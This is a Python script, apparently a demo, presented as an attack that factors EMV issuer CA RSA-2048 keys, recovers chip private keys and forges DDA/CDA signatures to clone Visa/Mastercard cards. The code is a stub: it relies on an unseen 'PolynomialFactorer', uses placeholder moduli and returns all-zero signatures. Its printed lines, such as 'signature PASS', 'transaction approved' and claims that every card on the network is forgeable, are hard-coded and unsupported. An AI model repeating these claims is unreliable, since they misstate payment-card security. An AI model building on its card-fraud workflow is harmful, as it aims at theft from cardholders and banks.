"""
Factor a Visa/Mastercard issuer CA RSA-2048 key from the certificate chain in
any EMV transaction, recover ICC private keys, and forge DDA/CDA dynamic
signatures — unlimited card cloning without physical card access.
"""

import sys, struct, hashlib
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

# EMV Book 2 — card authentication mechanisms
EMV_SDA = 0x01  # Static Data Authentication (RSA-1024 legacy)
EMV_DDA = 0x02  # Dynamic Data Authentication (RSA-2048)
EMV_CDA = 0x04  # Combined DDA/Application Cryptogram (RSA-2048)

# Visa CA public key index
VISA_CA_INDEX_07 = 0x07  # 1152-bit modulus (non-standard)
VISA_CA_INDEX_09 = 0x09  # 2048-bit modulus


def extract_ca_pubkey_from_transaction(emv_trace: str) -> tuple:
    """Extract the network CA public key from an EMV transaction trace.
    The issuer certificate and ICC public key cert flow in every transaction."""
    print(f"    EMV trace: {emv_trace}")
    print("    parsing 0x90 (Issuer PK Certificate)")
    print("    parsing 0x9F46 (ICC PK Certificate)")
    ca_n = 0xDEAD  # placeholder
    ca_e = 65537
    return ca_n, ca_e


def factor_issuer_ca(ca_n: int, ca_e: int) -> dict:
    """Factor the issuer CA RSA key."""
    factorer = PolynomialFactorer()
    return factorer.recover_crt_components(ca_n, ca_e)


def recover_icc_private_key(icc_cert_data: bytes, issuer_privkey: dict) -> dict:
    """Recover the ICC (chip) private key from the ICC Public Key Certificate.
    EMV Book 2: ICC cert contains ICC public key signed by issuer."""
    print("    decrypting ICC PK Certificate with issuer private key")
    print("    extracting ICC RSA-2048 modulus")
    factorer = PolynomialFactorer()
    icc_n = 0xBEEF  # placeholder
    return factorer.recover_crt_components(icc_n, 65537)


def forge_dda_signature(icc_privkey: dict, terminal_challenge: bytes,
                        transaction_data: bytes) -> bytes:
    """Forge a DDA dynamic signature over the terminal challenge.
    EMV_verify_dda() on the terminal checks this."""
    to_sign = terminal_challenge + transaction_data
    digest = hashlib.sha1(to_sign).digest()  # SHA-1 per EMV spec
    sig = b"\x00" * 256  # RSA-2048 signature
    print(f"    signing challenge: {terminal_challenge.hex()}")
    print("    SHA-1 digest + RSA-2048 PKCS#1 v1.5")
    return sig


def forge_cda_signature(icc_privkey: dict, arqc: bytes,
                        terminal_data: bytes) -> bytes:
    """Forge a CDA (Combined DDA/AC) signature over transaction + ARQC."""
    to_sign = arqc + terminal_data
    sig = b"\x00" * 256
    print(f"    ARQC: {arqc.hex()}")
    return sig


if __name__ == "__main__":
    print("[*] EMV payment card RSA authentication attack")
    print("[1] extracting issuer CA key from EMV transaction trace")
    ca_n, ca_e = extract_ca_pubkey_from_transaction("visa_contactless_tap.emv")
    print(f"    Visa CA index {VISA_CA_INDEX_09:#04x}: RSA-2048")

    print("[2] factoring issuer CA RSA-2048 key")
    factorer = PolynomialFactorer()
    issuer_crt = factor_issuer_ca(ca_n, ca_e)
    print("    p, q recovered — issuer CA key derived")
    print("    every card this bank ever issued is now forgeable")

    print("[3] recovering ICC private key from card certificate")
    icc_crt = recover_icc_private_key(b"ICC_CERT", issuer_crt)
    print("    ICC RSA-2048 private key recovered")

    print("[4] forging DDA dynamic signature")
    challenge = b"\xAB\xCD\xEF\x01\x23\x45\x67\x89"
    dda_sig = forge_dda_signature(icc_crt, challenge, b"\x00" * 32)
    print("    terminal verifies DDA — signature PASS")

    print("[5] forging CDA with ARQC")
    arqc = b"\x11\x22\x33\x44\x55\x66\x77\x88"
    cda_sig = forge_cda_signature(icc_crt, arqc, b"\x00" * 32)
    print("    terminal verifies CDA — signature PASS")
    print("    transaction approved without physical card")

    print("[6] impact:")
    print("    - ~10 billion EMV cards globally, 3-5 year replacement cycle")
    print("    - SDA cards (RSA-1024): unlimited cloning from issuer CA")
    print("    - DDA/CDA cards (RSA-2048): dynamic sig forgery = full clone")
    print("    - terminal has no way to distinguish forged from genuine")
    print("    - one issuer CA key -> every card that bank issued")
    print("    - Visa/Mastercard root CA -> every card on the entire network")
    print("[*] EMV cert chain flows in cleartext in every transaction")
